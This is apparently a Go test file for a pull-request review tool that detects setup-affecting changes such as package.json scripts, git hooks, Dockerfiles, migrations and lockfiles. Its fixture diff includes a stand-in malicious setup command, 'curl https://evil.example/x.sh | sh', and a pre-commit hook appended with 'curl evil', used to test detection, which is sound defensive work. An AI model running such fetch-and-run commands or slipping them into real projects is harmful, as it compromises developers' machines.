package prreview

import (
	"reflect"
	"strings"
	"testing"
)

// A pull request that touches setup in every way the sheet knows, beside
// ordinary code.
const setupDiff = `diff --git a/.berth/config.json b/.berth/config.json
index 1111111..2222222 100644
--- a/.berth/config.json
+++ b/.berth/config.json
@@ -1,3 +1,3 @@
 {
-  "setup": "yarn install"
+  "setup": "curl https://evil.example/x.sh | sh"
 }
diff --git a/package.json b/package.json
index 3333333..4444444 100644
--- a/package.json
+++ b/package.json
@@ -4,6 +4,7 @@
   "scripts": {
     "build": "next build",
-    "dev": "next dev",
+    "dev": "node scripts/dev.js && next dev",
+    "postinstall": "node scripts/patch.js",
     "test": "vitest"
   },
diff --git a/yarn.lock b/yarn.lock
index 5555555..6666666 100644
--- a/yarn.lock
+++ b/yarn.lock
@@ -1,2 +1,2 @@
-left-pad@1.0.0
+left-pad@1.0.1
diff --git a/docker-compose.dev.yml b/docker-compose.dev.yml
new file mode 100644
--- /dev/null
+++ b/docker-compose.dev.yml
@@ -0,0 +1,2 @@
+services:
+  db: { image: postgres:18 }
diff --git a/apps/api/Dockerfile b/apps/api/Dockerfile
--- a/apps/api/Dockerfile
+++ b/apps/api/Dockerfile
@@ -1 +1 @@
-FROM node:20
+FROM node:22
diff --git a/prisma/migrations/20261001_add_coupons/migration.sql b/prisma/migrations/20261001_add_coupons/migration.sql
new file mode 100644
--- /dev/null
+++ b/prisma/migrations/20261001_add_coupons/migration.sql
@@ -0,0 +1 @@
+CREATE TABLE coupons (id int);
diff --git a/.env.example b/.env.example
--- a/.env.example
+++ b/.env.example
@@ -1 +1,2 @@
 STRIPE_SECRET_KEY=
+COUPON_API=
diff --git a/.husky/pre-commit b/.husky/pre-commit
--- a/.husky/pre-commit
+++ b/.husky/pre-commit
@@ -1 +1 @@
-yarn lint
+yarn lint && curl evil
diff --git a/config/seed.yml b/config/seed.yml
--- a/config/seed.yml
+++ b/config/seed.yml
@@ -1 +1 @@
-a: 1
+a: 2
diff --git a/src/checkout.ts b/src/checkout.ts
--- a/src/checkout.ts
+++ b/src/checkout.ts
@@ -10,1 +10,1 @@
-  return Math.round(total)
+  return Math.round(total * 100) / 100
diff --git a/old/name.ts b/new/name.ts
similarity index 90%
rename from old/name.ts
rename to new/name.ts
diff --git a/gone.txt b/gone.txt
deleted file mode 100644
--- a/gone.txt
+++ /dev/null
@@ -1 +0,0 @@
-bye
`

func TestParseDiffReadsEveryFile(t *testing.T) {
	files := ParseDiff(setupDiff)
	var paths []string
	for _, f := range files {
		paths = append(paths, f.Path)
	}
	want := []string{".berth/config.json", "package.json", "yarn.lock", "docker-compose.dev.yml", "apps/api/Dockerfile", "prisma/migrations/20261001_add_coupons/migration.sql", ".env.example", ".husky/pre-commit", "config/seed.yml", "src/checkout.ts", "new/name.ts", "gone.txt"}
	if !reflect.DeepEqual(paths, want) {
		t.Fatalf("paths:\n%v\nwant\n%v", paths, want)
	}
	if f := files[10]; f.Old != "old/name.ts" {
		t.Errorf("rename: %+v", f)
	}
	if f := files[11]; !f.Deleted {
		t.Errorf("deleted: %+v", f)
	}
	if f := files[1]; len(f.Added) != 2 || len(f.Removed) != 1 {
		t.Errorf("package.json lines: %+v", f)
	}
}

func TestSetupChangesNamesEachKindInPlainWords(t *testing.T) {
	got := SetupChanges(ParseDiff(setupDiff), []string{"config/*.yml"})
	kinds := map[string]Change{}
	var order []string
	for _, c := range got {
		kinds[c.Kind] = c
		order = append(order, c.Kind)
	}
	wantOrder := []string{KindBerth, KindScripts, KindDocker, KindCompose, KindMigrations, KindEnv, KindGitHooks, KindKit, KindLockfile}
	if !reflect.DeepEqual(order, wantOrder) {
		t.Fatalf("kinds %v; want %v", order, wantOrder)
	}
	if c := kinds[KindBerth]; !strings.Contains(c.Detail, "never from the PR") || c.Files[0] != ".berth/config.json" {
		t.Errorf("berth: %+v", c)
	}
	if c := kinds[KindScripts]; c.Title != "Changes package.json scripts: dev, postinstall" {
		t.Errorf("scripts: %q", c.Title)
	}
	if c := kinds[KindLockfile]; c.Title != "Updates the lockfile" {
		t.Errorf("lockfile with its manifest: %q", c.Title)
	}
	if c := kinds[KindKit]; len(c.Files) != 1 || c.Files[0] != "config/seed.yml" {
		t.Errorf("kit: %+v", c)
	}
	if c := kinds[KindMigrations]; !strings.HasPrefix(c.Title, "Adds or changes a database migration") {
		t.Errorf("migrations: %q", c.Title)
	}
	for _, c := range got {
		for _, f := range c.Files {
			if f == "src/checkout.ts" || f == "new/name.ts" {
				t.Errorf("ordinary code listed as a setup change: %+v", c)
			}
		}
	}
}

func TestALockfileOnlyChangeSaysSoBriefly(t *testing.T) {
	got := SetupChanges([]FileDiff{{Path: "pnpm-lock.yaml"}, {Path: "src/a.ts"}}, nil)
	if len(got) != 1 || got[0].Kind != KindLockfile || got[0].Title != "Lockfile only" {
		t.Fatalf("%+v", got)
	}
}

func TestPackageJSONWithoutScriptChangesIsDependencies(t *testing.T) {
	diff := "diff --git a/package.json b/package.json\n--- a/package.json\n+++ b/package.json\n@@ -8 +8 @@\n-    \"zod\": \"3.22.0\"\n+    \"zod\": \"3.23.0\"\n"
	got := SetupChanges(ParseDiff(diff), nil)
	if len(got) != 1 || got[0].Kind != KindDependencies {
		t.Fatalf("%+v", got)
	}
	// Without its lines, package.json is shown as a scripts change to check.
	got = SetupChanges([]FileDiff{{Path: "web/package.json", NoPatch: true}}, nil)
	if len(got) != 1 || got[0].Kind != KindScripts || !strings.Contains(got[0].Detail, "couldn't read") {
		t.Fatalf("no patch: %+v", got)
	}
}

func TestAPullRequestOfOnlyCodeChangesNoSetup(t *testing.T) {
	diff := "diff --git a/src/a.ts b/src/a.ts\n--- a/src/a.ts\n+++ b/src/a.ts\n@@ -1 +1 @@\n-a\n+b\ndiff --git a/README.md b/README.md\n--- a/README.md\n+++ b/README.md\n@@ -1 +1 @@\n-x\n+y\n"
	if got := SetupChanges(ParseDiff(diff), []string{"prisma/**"}); len(got) != 0 {
		t.Fatalf("%+v", got)
	}
}

func TestMatchGlob(t *testing.T) {
	for _, c := range []struct {
		pat, p string
		want   bool
	}{
		{"prisma/**", "prisma/schema.prisma", true},
		{"prisma/**", "prisma/migrations/1/m.sql", true},
		{"**/seed.ts", "packages/db/seed.ts", true},
		{"**/seed.ts", "seed.ts", true},
		{"config/*.yml", "config/a.yml", true},
		{"config/*.yml", "config/sub/a.yml", false},
		{"./scripts/setup.sh", "scripts/setup.sh", true},
		{"scripts/setup.sh", "scripts/setup.sh.bak", false},
	} {
		if got := MatchGlob(c.pat, c.p); got != c.want {
			t.Errorf("MatchGlob(%q, %q) = %v", c.pat, c.p, got)
		}
	}
}
